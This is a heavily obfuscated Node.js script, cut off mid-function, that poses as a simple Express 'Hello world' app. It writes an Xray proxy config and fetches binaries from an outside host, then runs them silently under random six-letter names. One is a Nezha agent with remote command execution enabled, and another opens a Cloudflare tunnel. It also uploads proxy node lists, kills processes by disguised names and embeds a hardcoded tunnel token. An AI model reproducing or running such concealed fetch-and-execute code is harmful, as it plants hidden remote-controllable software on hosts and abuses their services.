const _0x351c3c=_0x163a;(function(_0x4a749c,_0x4aa61c){const _0x524fe6={_0x5f20ab:0x1ba,_0x4194cd:0x17b,_0x2e236d:0x15b,_0x395de4:0x1f0,_0x1933ca:0x173,_0x542393:0x1d9},_0x10c241=_0x163a,_0x3437ac=_0x4a749c();while(!![]){try{const _0xc604d=parseInt(_0x10c241(0x18a))/0x1*(-parseInt(_0x10c241(0x14e))/0x2)+-parseInt(_0x10c241(_0x524fe6._0x5f20ab))/0x3+-parseInt(_0x10c241(_0x524fe6._0x4194cd))/0x4*(-parseInt(_0x10c241(_0x524fe6._0x2e236d))/0x5)+parseInt(_0x10c241(_0x524fe6._0x395de4))/0x6+-parseInt(_0x10c241(0x1b8))/0x7+parseInt(_0x10c241(_0x524fe6._0x1933ca))/0x8*(-parseInt(_0x10c241(0x1a2))/0x9)+parseInt(_0x10c241(0x1a4))/0xa*(parseInt(_0x10c241(_0x524fe6._0x542393))/0xb);if(_0xc604d===_0x4aa61c)break;else _0x3437ac['push'](_0x3437ac['shift']());}catch(_0x4f6cda){_0x3437ac['push'](_0x3437ac['shift']());}}}(_0x198a,0x31331));const express=require(_0x351c3c(0x1b6)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x351c3c(0x141)),{promisify}=require(_0x351c3c(0x1d1)),exec=promisify(require(_0x351c3c(0x1c4))[_0x351c3c(0x1e5)]),UPLOAD_URL=process[_0x351c3c(0x1c7)][_0x351c3c(0x1a5)]||'',PROJECT_URL=process[_0x351c3c(0x1c7)][_0x351c3c(0x15f)]||'',AUTO_ACCESS=process[_0x351c3c(0x1c7)][_0x351c3c(0x195)]||![],FILE_PATH=process[_0x351c3c(0x1c7)]['FILE_PATH']||_0x351c3c(0x15d),SUB_PATH=process[_0x351c3c(0x1c7)][_0x351c3c(0x151)]||_0x351c3c(0x1ea),PORT=process[_0x351c3c(0x1c7)][_0x351c3c(0x19c)]||process[_0x351c3c(0x1c7)][_0x351c3c(0x198)]||0xbb8,UUID=process[_0x351c3c(0x1c7)][_0x351c3c(0x193)]||'e139fe12-c3a3-495c-9981-eeb34ab4e591',NEZHA_SERVER=process[_0x351c3c(0x1c7)][_0x351c3c(0x1c2)]||'',NEZHA_PORT=process[_0x351c3c(0x1c7)][_0x351c3c(0x1f1)]||'',NEZHA_KEY=process[_0x351c3c(0x1c7)][_0x351c3c(0x1ae)]||'',ARGO_DOMAIN=process['env'][_0x351c3c(0x199)]||_0x351c3c(0x1b3),ARGO_AUTH=process[_0x351c3c(0x1c7)][_0x351c3c(0x1a8)]||_0x351c3c(0x1eb),ARGO_PORT=process['env']['ARGO_PORT']||0xb0b1,CFIP=process[_0x351c3c(0x1c7)]['CFIP']||_0x351c3c(0x1c8),CFPORT=process[_0x351c3c(0x1c7)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||'';!fs[_0x351c3c(0x1af)](FILE_PATH)?(fs[_0x351c3c(0x201)](FILE_PATH),console[_0x351c3c(0x19a)](FILE_PATH+_0x351c3c(0x17d))):console[_0x351c3c(0x19a)](FILE_PATH+_0x351c3c(0x1ff));function generateRandomName(){const _0x2c55df=_0x351c3c,_0x48fc5f=_0x2c55df(0x167);let _0xae61c0='';for(let _0x1f4e77=0x0;_0x1f4e77<0x6;_0x1f4e77++){_0xae61c0+=_0x48fc5f[_0x2c55df(0x174)](Math['floor'](Math['random']()*_0x48fc5f[_0x2c55df(0x181)]));}return _0xae61c0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x351c3c(0x194)](FILE_PATH,npmName),phpPath=path[_0x351c3c(0x194)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x351c3c(0x194)](FILE_PATH,botName),subPath=path[_0x351c3c(0x194)](FILE_PATH,_0x351c3c(0x1e6)),listPath=path[_0x351c3c(0x194)](FILE_PATH,'list.txt'),bootLogPath=path[_0x351c3c(0x194)](FILE_PATH,_0x351c3c(0x190)),configPath=path[_0x351c3c(0x194)](FILE_PATH,_0x351c3c(0x1c1));function deleteNodes(){const _0x37bed3={_0x462622:0x1af,_0x226f2a:0x1f5,_0x141fb1:0x1b4,_0x312c6e:0x1cc,_0x58ab06:0x181},_0x3c2096=_0x351c3c;try{if(!UPLOAD_URL)return;if(!fs[_0x3c2096(_0x37bed3._0x462622)](subPath))return;let _0x1eea29;try{_0x1eea29=fs[_0x3c2096(0x1e0)](subPath,_0x3c2096(0x165));}catch{return null;}const _0x4e5d7a=Buffer[_0x3c2096(_0x37bed3._0x226f2a)](_0x1eea29,_0x3c2096(0x16e))[_0x3c2096(0x1bb)](_0x3c2096(0x165)),_0x115cab=_0x4e5d7a[_0x3c2096(_0x37bed3._0x141fb1)]('\x0a')[_0x3c2096(_0x37bed3._0x312c6e)](_0x347469=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3c2096(0x1bc)](_0x347469));if(_0x115cab[_0x3c2096(_0x37bed3._0x58ab06)]===0x0)return;return axios[_0x3c2096(0x150)](UPLOAD_URL+_0x3c2096(0x1cb),JSON[_0x3c2096(0x1b1)]({'nodes':_0x115cab}),{'headers':{'Content-Type':_0x3c2096(0x1ac)}})[_0x3c2096(0x204)](_0x58db67=>{return null;}),null;}catch(_0x5f4816){return null;}}function cleanupOldFiles(){const _0x38f2e4=_0x351c3c;try{const _0x4aafe2=fs[_0x38f2e4(0x1c5)](FILE_PATH);_0x4aafe2[_0x38f2e4(0x1d3)](_0x446832=>{const _0x1559fd=_0x38f2e4,_0x3b1724=path[_0x1559fd(0x194)](FILE_PATH,_0x446832);try{const _0x28a850=fs[_0x1559fd(0x145)](_0x3b1724);_0x28a850['isFile']()&&fs[_0x1559fd(0x164)](_0x3b1724);}catch(_0x4c5bd3){}});}catch(_0x1e961a){}}async function generateConfig(){const _0x34997c={_0x12d22f:0x166,_0x1076c6:0x1a7,_0x3cde47:0x1a7,_0x44fd9d:0x156,_0x40320f:0x1ed,_0xc694a4:0x1b0,_0x36ce2e:0x16f,_0x51194b:0x179,_0x3c4be0:0x158,_0x4913f6:0x1b0,_0x413a76:0x15e,_0x537d2e:0x17c,_0x550086:0x1f8,_0x57c092:0x158,_0x5d4559:0x196,_0x3a7c75:0x1a6,_0x18f4d6:0x1da,_0xcc187b:0x148,_0x425321:0x192,_0x1fe406:0x1b1},_0x169910=_0x351c3c,_0x58c3c0={'log':{'access':_0x169910(0x166),'error':_0x169910(_0x34997c._0x12d22f),'loglevel':_0x169910(_0x34997c._0x1076c6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x169910(0x16f),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x169910(_0x34997c._0x3cde47),'fallbacks':[{'dest':0xbb9},{'path':_0x169910(_0x34997c._0x44fd9d),'dest':0xbba},{'path':_0x169910(0x188),'dest':0xbbb},{'path':_0x169910(0x17c),'dest':0xbbc}]},'streamSettings':{'network':_0x169910(_0x34997c._0x40320f)}},{'port':0xbb9,'listen':_0x169910(_0x34997c._0xc694a4),'protocol':_0x169910(0x16f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x169910(0x1a7)}},{'port':0xbba,'listen':_0x169910(_0x34997c._0xc694a4),'protocol':_0x169910(_0x34997c._0x36ce2e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x169910(0x1a7),'wsSettings':{'path':_0x169910(_0x34997c._0x44fd9d)}},'sniffing':{'enabled':!![],'destOverride':[_0x169910(0x1f8),_0x169910(0x158),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x169910(_0x34997c._0xc694a4),'protocol':_0x169910(_0x34997c._0x51194b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x169910(0x188)}},'sniffing':{'enabled':!![],'destOverride':[_0x169910(0x1f8),_0x169910(_0x34997c._0x3c4be0),_0x169910(0x196)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x169910(_0x34997c._0x4913f6),'protocol':_0x169910(_0x34997c._0x413a76),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x169910(_0x34997c._0x537d2e)}},'sniffing':{'enabled':!![],'destOverride':[_0x169910(_0x34997c._0x550086),_0x169910(_0x34997c._0x57c092),_0x169910(_0x34997c._0x5d4559)],'metadataOnly':![]}}],'dns':{'servers':[_0x169910(_0x34997c._0x3a7c75)]},'outbounds':[{'protocol':_0x169910(_0x34997c._0x18f4d6),'tag':_0x169910(_0x34997c._0xcc187b)},{'protocol':'blackhole','tag':'block'}]};fs[_0x169910(_0x34997c._0x425321)](path[_0x169910(0x194)](FILE_PATH,'config.json'),JSON[_0x169910(_0x34997c._0x1fe406)](_0x58c3c0,null,0x2));}function getSystemArchitecture(){const _0x3fad0f={_0x19182c:0x203,_0x4e6344:0x14a},_0x3b7e79=_0x351c3c,_0x45cf77=os[_0x3b7e79(_0x3fad0f._0x19182c)]();return _0x45cf77===_0x3b7e79(0x18b)||_0x45cf77==='arm64'||_0x45cf77===_0x3b7e79(_0x3fad0f._0x4e6344)?_0x3b7e79(0x18b):_0x3b7e79(0x1ee);}function downloadFile(_0x52da58,_0x26c443,_0x38907e){const _0x2b83ba={_0x3f981f:0x1af,_0x2138e7:0x201,_0x56b0a4:0x1b7,_0x645aaf:0x178,_0x16c49f:0x204},_0x50845d={_0x46f66c:0x154,_0x5adb7f:0x1fe,_0x39372f:0x162},_0x310553={_0xbf73fa:0x1ce,_0x34db3e:0x162},_0x341788={_0x3aa971:0x19a},_0x2c70fa=_0x351c3c,_0x5eb16d=_0x52da58;!fs[_0x2c70fa(_0x2b83ba._0x3f981f)](FILE_PATH)&&fs[_0x2c70fa(_0x2b83ba._0x2138e7)](FILE_PATH,{'recursive':!![]});const _0x377ec6=fs['createWriteStream'](_0x5eb16d);axios({'method':_0x2c70fa(_0x2b83ba._0x56b0a4),'url':_0x26c443,'responseType':_0x2c70fa(0x1fc)})[_0x2c70fa(_0x2b83ba._0x645aaf)](_0xdb7319=>{const _0x44a79b={_0x488a69:0x163,_0xad84cb:0x18d},_0x43bc96=_0x2c70fa;_0xdb7319[_0x43bc96(0x1bd)][_0x43bc96(0x1b2)](_0x377ec6),_0x377ec6['on'](_0x43bc96(_0x310553._0xbf73fa),()=>{const _0x38b62a=_0x43bc96;_0x377ec6[_0x38b62a(0x169)](),console[_0x38b62a(_0x341788._0x3aa971)](_0x38b62a(0x163)+path[_0x38b62a(0x154)](_0x5eb16d)+_0x38b62a(0x1dd)),_0x38907e(null,_0x5eb16d);}),_0x377ec6['on'](_0x43bc96(_0x310553._0x34db3e),_0x267c9d=>{const _0xd4e95d=_0x43bc96;fs[_0xd4e95d(0x200)](_0x5eb16d,()=>{});const _0x1e0287=_0xd4e95d(_0x44a79b._0x488a69)+path[_0xd4e95d(0x154)](_0x5eb16d)+_0xd4e95d(_0x44a79b._0xad84cb)+_0x267c9d['message'];console[_0xd4e95d(0x162)](_0x1e0287),_0x38907e(_0x1e0287);});})[_0x2c70fa(_0x2b83ba._0x16c49f)](_0x5796bc=>{const _0x45b05a=_0x2c70fa,_0x55fec4=_0x45b05a(0x163)+path[_0x45b05a(_0x50845d._0x46f66c)](_0x5eb16d)+_0x45b05a(0x18d)+_0x5796bc[_0x45b05a(_0x50845d._0x5adb7f)];console[_0x45b05a(_0x50845d._0x39372f)](_0x55fec4),_0x38907e(_0x55fec4);});}async function downloadFilesAndRun(){const _0x23acab={_0x4687b4:0x181,_0x40689c:0x19f,_0x29901f:0x184,_0x2bd84f:0x1e8,_0x58b996:0x153,_0x5b2e5d:0x1b4,_0x292980:0x177,_0x10fb11:0x1ec,_0x496980:0x1ca,_0x5b332d:0x1cf,_0x2441ba:0x1fa,_0x18feba:0x194,_0x1c38bf:0x18e,_0x1c6407:0x1f6,_0x34a79d:0x1d2,_0x4547f7:0x1d7,_0x5b7bba:0x19a,_0x3c94d9:0x1d4,_0x4eebf6:0x162,_0x288d56:0x1e1,_0x42c108:0x18f,_0x50259a:0x1f3,_0x227e17:0x1d4,_0x349e8e:0x162,_0x15cf77:0x207,_0x2bfcb9:0x206,_0x57ffbf:0x1f6,_0x261851:0x19a,_0x4e63de:0x1db,_0x130212:0x208,_0x16ad9e:0x15a,_0x2970f6:0x142},_0x2f7dd7={_0x440d4d:0x15c},_0x200b2c=_0x351c3c,_0x2dd68c=getSystemArchitecture(),_0x33dbb7=getFilesForArchitecture(_0x2dd68c);if(_0x33dbb7[_0x200b2c(_0x23acab._0x4687b4)]===0x0){console['log'](_0x200b2c(_0x23acab._0x40689c));return;}const _0x2ae776=_0x33dbb7[_0x200b2c(_0x23acab._0x29901f)](_0x2bb15c=>{return new Promise((_0x562a05,_0x24158d)=>{const _0x5644aa=_0x163a;downloadFile(_0x2bb15c[_0x5644aa(_0x2f7dd7._0x440d4d)],_0x2bb15c['fileUrl'],(_0x1a0778,_0x102455)=>{_0x1a0778?_0x24158d(_0x1a0778):_0x562a05(_0x102455);});});});try{await Promise[_0x200b2c(_0x23acab._0x2bd84f)](_0x2ae776);}catch(_0x341a43){console['error'](_0x200b2c(0x1b9),_0x341a43);return;}function _0x327a8e(_0x14beed){const _0xe3db17={_0x2e8421:0x1af},_0x2cdcf0={_0x4e0523:0x162},_0x3a6314=_0x200b2c,_0x5aefe8=0x1fd;_0x14beed[_0x3a6314(0x1d3)](_0x3d5237=>{const _0x446127=_0x3a6314;fs[_0x446127(_0xe3db17._0x2e8421)](_0x3d5237)&&fs[_0x446127(0x191)](_0x3d5237,_0x5aefe8,_0x48b272=>{const _0x2a61cc=_0x446127;_0x48b272?console[_0x2a61cc(_0x2cdcf0._0x4e0523)](_0x2a61cc(0x1c9)+_0x3d5237+':\x20'+_0x48b272):console['log'](_0x2a61cc(0x149)+_0x3d5237+':\x20'+_0x5aefe8['toString'](0x8));});});}const _0x5f97ac=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x327a8e(_0x5f97ac);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5c5a2e=NEZHA_SERVER[_0x200b2c(_0x23acab._0x58b996)](':')?NEZHA_SERVER[_0x200b2c(_0x23acab._0x5b2e5d)](':')['pop']():'',_0x18b23a=new Set([_0x200b2c(0x161),_0x200b2c(0x1e1),_0x200b2c(0x189),_0x200b2c(_0x23acab._0x292980),_0x200b2c(_0x23acab._0x10fb11),_0x200b2c(_0x23acab._0x496980)]),_0x115049=_0x18b23a['has'](_0x5c5a2e)?_0x200b2c(0x1fd):_0x200b2c(_0x23acab._0x5b332d),_0x27d5a0='\x0aclient_secret:\x20'+NEZHA_KEY+_0x200b2c(_0x23acab._0x2441ba)+NEZHA_SERVER+_0x200b2c(0x1dc)+_0x115049+_0x200b2c(0x1fb)+UUID;fs[_0x200b2c(0x192)](path[_0x200b2c(_0x23acab._0x18feba)](FILE_PATH,_0x200b2c(_0x23acab._0x1c38bf)),_0x27d5a0);const _0x5611b5=_0x200b2c(_0x23acab._0x1c6407)+phpPath+_0x200b2c(_0x23acab._0x34a79d)+FILE_PATH+_0x200b2c(_0x23acab._0x4547f7);try{await exec(_0x5611b5),console[_0x200b2c(_0x23acab._0x5b7bba)](phpName+_0x200b2c(_0x23acab._0x3c94d9)),await new Promise(_0x9ba59a=>setTimeout(_0x9ba59a,0x3e8));}catch(_0x25b816){console[_0x200b2c(_0x23acab._0x4eebf6)](_0x200b2c(0x14b)+_0x25b816);}}else{let _0x4e4e2f='';const _0x2c5fb5=[_0x200b2c(0x161),_0x200b2c(_0x23acab._0x288d56),_0x200b2c(0x189),_0x200b2c(_0x23acab._0x292980),'2083',_0x200b2c(0x1ca)];_0x2c5fb5[_0x200b2c(0x153)](NEZHA_PORT)&&(_0x4e4e2f=_0x200b2c(_0x23acab._0x42c108));const _0x4820a5=_0x200b2c(0x1f6)+npmPath+_0x200b2c(0x1e9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x200b2c(_0x23acab._0x50259a)+NEZHA_KEY+'\x20'+_0x4e4e2f+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4820a5),console['log'](npmName+_0x200b2c(_0x23acab._0x227e17)),await new Promise(_0x446d25=>setTimeout(_0x446d25,0x3e8));}catch(_0x17ab9d){console[_0x200b2c(_0x23acab._0x349e8e)](_0x200b2c(_0x23acab._0x15cf77)+_0x17ab9d);}}}else console[_0x200b2c(_0x23acab._0x5b7bba)](_0x200b2c(_0x23acab._0x2bfcb9));const _0x429345=_0x200b2c(_0x23acab._0x57ffbf)+webPath+'\x20-c\x20'+FILE_PATH+_0x200b2c(0x1c3);try{await exec(_0x429345),console[_0x200b2c(_0x23acab._0x261851)](webName+'\x20is\x20running'),await new Promise(_0x373c86=>setTimeout(_0x373c86,0x3e8));}catch(_0x5eaf0f){console[_0x200b2c(0x162)](_0x200b2c(0x187)+_0x5eaf0f);}if(fs['existsSync'](botPath)){let _0x5c913b;if(ARGO_AUTH[_0x200b2c(_0x23acab._0x4e63de)](/^[A-Z0-9a-z=]{120,250}$/))_0x5c913b=_0x200b2c(_0x23acab._0x130212)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x5c913b=_0x200b2c(_0x23acab._0x16ad9e)+FILE_PATH+_0x200b2c(0x170):_0x5c913b=_0x200b2c(_0x23acab._0x2970f6)+FILE_PATH+_0x200b2c(0x146)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5c913b+'\x20>/dev/null\x202>&1\x20&'),console[_0x200b2c(_0x23acab._0x261851)](botName+'\x20is\x20running'),await new Promise(_0x1a0da5=>setTimeout(_0x1a0da5,0x7d0));}catch(_0x4c60a1){console[_0x200b2c(0x162)](_0x200b2c(0x1a9)+_0x4c60a1);}}await new Promise(_0x327700=>setTimeout(_0x327700,0x1388));}function getFilesForArchitecture(_0x3f763b){const _0x1bc58d={_0x2d23a5:0x18b,_0x356d35:0x147,_0x2f1f45:0x1c6,_0x11c81c:0x1f2},_0x57f722=_0x351c3c;let _0x1c3130;_0x3f763b===_0x57f722(_0x1bc58d._0x2d23a5)?_0x1c3130=[{'fileName':webPath,'fileUrl':_0x57f722(0x183)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x1c3130=[{'fileName':webPath,'fileUrl':_0x57f722(_0x1bc58d._0x356d35)},{'fileName':botPath,'fileUrl':_0x57f722(0x182)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x473a44=_0x3f763b===_0x57f722(0x18b)?'https://arm64.ssss.nyc.mn/agent':_0x57f722(0x172);_0x1c3130[_0x57f722(_0x1bc58d._0x2f1f45)]({'fileName':npmPath,'fileUrl':_0x473a44});}else{const _0x4ee8ef=_0x3f763b===_0x57f722(0x18b)?'https://arm64.ssss.nyc.mn/v1':_0x57f722(_0x1bc58d._0x11c81c);_0x1c3130[_0x57f722(0x1c6)]({'fileName':phpPath,'fileUrl':_0x4ee8ef});}}return _0x1c3130;}function argoType(){const _0x37519a={_0x45544b:0x14c,_0x2a390f:0x194,_0x11a9b3:0x16b,_0x3e0c61:0x16c,_0x5e0bf4:0x16d,_0x136064:0x19a},_0x22dc5b=_0x351c3c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x22dc5b(_0x37519a._0x45544b));return;}if(ARGO_AUTH['includes'](_0x22dc5b(0x1ad))){fs['writeFileSync'](path[_0x22dc5b(_0x37519a._0x2a390f)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x263996='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x22dc5b(0x1b4)]('\x22')[0xb]+_0x22dc5b(0x1f9)+path[_0x22dc5b(0x194)](FILE_PATH,_0x22dc5b(0x1bf))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x22dc5b(_0x37519a._0x11a9b3)+ARGO_PORT+_0x22dc5b(_0x37519a._0x3e0c61);fs['writeFileSync'](path['join'](FILE_PATH,_0x22dc5b(_0x37519a._0x5e0bf4)),_0x263996);}else console[_0x22dc5b(_0x37519a._0x136064)](_0x22dc5b(0x202));}function _0x163a(_0x558631,_0x46b62c){const _0x198a2e=_0x198a();return _0x163a=function(_0x163aea,_0x32360e){_0x163aea=_0x163aea-0x141;let _0x5d0a26=_0x198a2e[_0x163aea];return _0x5d0a26;},_0x163a(_0x558631,_0x46b62c);}function _0x198a(){const _0x2ea5ac=['config.json','NEZHA_SERVER','/config.json\x20>/dev/null\x202>&1\x20&','child_process','readdirSync','unshift','env','youxuan.orwennes.site','Empowerment\x20failed\x20for\x20','2053','/api/delete-nodes','filter','firefox','finish','false','readFile','util','\x20-c\x20\x22','forEach','\x20is\x20running','automatic\x20access\x20task\x20added\x20successfully','index.html','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','substring','11QsZZla','freedom','match','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20successfully','/sub.txt\x20saved\x20successfully','Nodes\x20uploaded\x20successfully','readFileSync','8443','isp','.exe\x20>\x20nul\x202>&1','taskkill\x20/f\x20/im\x20','exec','sub.txt','/api/add-nodes','all','\x20-s\x20','sub','eyJhIjoiNzVlNTFlNzExOWY2OWE5ZWFhOTMwNTJjYTdkMjZmYTEiLCJ0IjoiNGRjNGFlZTktYzliZi00NDM1LThkYWQtNWE2Zjg0NTUxNTQwIiwicyI6Ik4ySmhZbVF5WVdJdFlURXdPQzAwWWpRd0xUZzVORFl0TkdFeE1HVTJaREpsWVdJNSJ9','2083','tcp','amd','clear','1078116sTpmtK','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','\x20-p\x20','Skipping\x20adding\x20automatic\x20access\x20task','from','nohup\x20','\x20>/dev/null\x202>&1\x20&','http','\x0a\x20\x20credentials-file:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','stream','true','message','\x20already\x20exists','unlink','mkdirSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','arch','catch','utf8','NEZHA\x20variable\x20is\x20empty,skip\x20running','npm\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','path','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','App\x20is\x20running','&path=%2Ftrojan-argo%3Fed%3D2560#','statSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/web','direct','Empowerment\x20success\x20for\x20','aarch64','php\x20running\x20error:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://oooo.serv00.net/add-url','26JodoWE','response','post','SUB_PATH','auto','includes','basename','https://api.ip.sb/geoip','/vless-argo','/vmess-argo?ed=2560','tls','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','130EeBMrE','fileName','.tmp','trojan','PROJECT_URL','countryCode','443','error','Download\x20','unlinkSync','utf-8','/dev/null','abcdefghijklmnopqrstuvwxyz','platform','close','promises','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel.yml','base64','vless','/tunnel.yml\x20run','push','https://amd64.ssss.nyc.mn/agent','16LatTEA','charAt','&path=%2Fvless-argo%3Fed%3D2560#','ARGO_DOMAIN:','2087','then','vmess','Mozilla/5.0','15556uwUtAX','/trojan-argo','\x20is\x20created','\x0a\x0atrojan://','Error\x20in\x20startserver:','\x22\x20>\x20/dev/null\x202>&1','length','https://amd64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/web','map','replace','success','web\x20running\x20error:\x20','/vmess-argo','2096','20465IXEupr','arm','win32','\x20failed:\x20','config.yaml','--tls','boot.log','chmod','writeFileSync','UUID','join','AUTO_ACCESS','quic','status','PORT','ARGO_DOMAIN','log','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','SERVER_PORT','\x20>\x20nul\x202>&1','del\x20/f\x20/q\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','text/plain;\x20charset=utf-8','send','368208riXMJF','&fp=firefox&type=ws&host=','9659690GHfYVF','UPLOAD_URL','https+local://8.8.8.8/dns-query','none','ARGO_AUTH','Error\x20executing\x20command:\x20','Unhandled\x20error\x20in\x20startserver:','Error\x20reading\x20boot.log:','application/json','TunnelSecret','NEZHA_KEY','existsSync','127.0.0.1','stringify','pipe','deno.orwennes.site','split','?security=tls&sni=','express','get','2183629TZeNDe','Error\x20downloading\x20files:','1156296vspzjA','toString','test','data','country_code','tunnel.json','Add\x20automatic\x20access\x20task\x20faild:\x20'];_0x198a=function(){return _0x2ea5ac;};return _0x198a();}async function extractDomains(){const _0x514c8e={_0x55d267:0x194,_0x565200:0x1d3,_0x3f5473:0x181,_0x191f8a:0x19a,_0xcf0ccf:0x190,_0x54eb25:0x1f6,_0x21242a:0x162,_0x576233:0x1ab},_0x50c08d={_0x25faa5:0x1bd,_0x17fb32:0x1e2,_0x429d51:0x160,_0x16b446:0x1bd},_0x3593e5={_0x3fb0dd:0x168,_0x4359b4:0x1e4,_0x5fc2a6:0x174,_0x7e738a:0x1d8,_0x1756f4:0x180},_0x272681=_0x351c3c;let _0x2d4309;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2d4309=ARGO_DOMAIN,console[_0x272681(0x19a)](_0x272681(0x176),_0x2d4309),await _0xc075fd(_0x2d4309);else try{const _0x4f3543=fs[_0x272681(0x1e0)](path[_0x272681(_0x514c8e._0x55d267)](FILE_PATH,'boot.log'),'utf-8'),_0x5deb7f=_0x4f3543['split']('\x0a'),_0x265e8e=[];_0x5deb7f[_0x272681(_0x514c8e._0x565200)](_0x4d857f=>{const _0x19a858=_0x272681,_0x1a8970=_0x4d857f['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1a8970){const _0xef659d=_0x1a8970[0x1];_0x265e8e[_0x19a858(0x171)](_0xef659d);}});if(_0x265e8e[_0x272681(_0x514c8e._0x3f5473)]>0x0)_0x2d4309=_0x265e8e[0x0],console[_0x272681(_0x514c8e._0x191f8a)]('ArgoDomain:',_0x2d4309),await _0xc075fd(_0x2d4309);else{console[_0x272681(0x19a)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x272681(0x164)](path[_0x272681(0x194)](FILE_PATH,_0x272681(_0x514c8e._0xcf0ccf)));async function _0x507884(){const _0x568bd1=_0x272681;try{process[_0x568bd1(_0x3593e5._0x3fb0dd)]===_0x568bd1(0x18c)?await exec(_0x568bd1(_0x3593e5._0x4359b4)+botName+_0x568bd1(0x1e3)):await exec('pkill\x20-f\x20\x22['+botName[_0x568bd1(_0x3593e5._0x5fc2a6)](0x0)+']'+botName[_0x568bd1(_0x3593e5._0x7e738a)](0x1)+_0x568bd1(_0x3593e5._0x1756f4));}catch(_0x59f8c4){}}_0x507884(),await new Promise(_0x5697ae=>setTimeout(_0x5697ae,0xbb8));const _0xe285c1=_0x272681(0x142)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x272681(_0x514c8e._0x54eb25)+botPath+'\x20'+_0xe285c1+_0x272681(0x1f7)),console['log'](botName+_0x272681(0x1d4)),await new Promise(_0x3d9108=>setTimeout(_0x3d9108,0xbb8)),await extractDomains();}catch(_0x5370e1){console[_0x272681(_0x514c8e._0x21242a)]('Error\x20executing\x20command:\x20'+_0x5370e1);}}}catch(_0x361e7a){console['error'](_0x272681(_0x514c8e._0x576233),_0x361e7a);}async function _0x32c88a(){const _0x4a5754=_0x272681;try{const _0x319edd=await axios[_0x4a5754(0x1b7)](_0x4a5754(0x155),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x319edd[_0x4a5754(0x1bd)]&&_0x319edd[_0x4a5754(0x1bd)][_0x4a5754(0x1be)]&&_0x319edd[_0x4a5754(_0x50c08d._0x25faa5)][_0x4a5754(_0x50c08d._0x17fb32)])return(_0x319edd[_0x4a5754(_0x50c08d._0x25faa5)]['country_code']+'-'+_0x319edd[_0x4a5754(0x1bd)][_0x4a5754(_0x50c08d._0x17fb32)])['replace'](/\s+/g,'_');}catch(_0x231cff){try{const _0x329a18=await 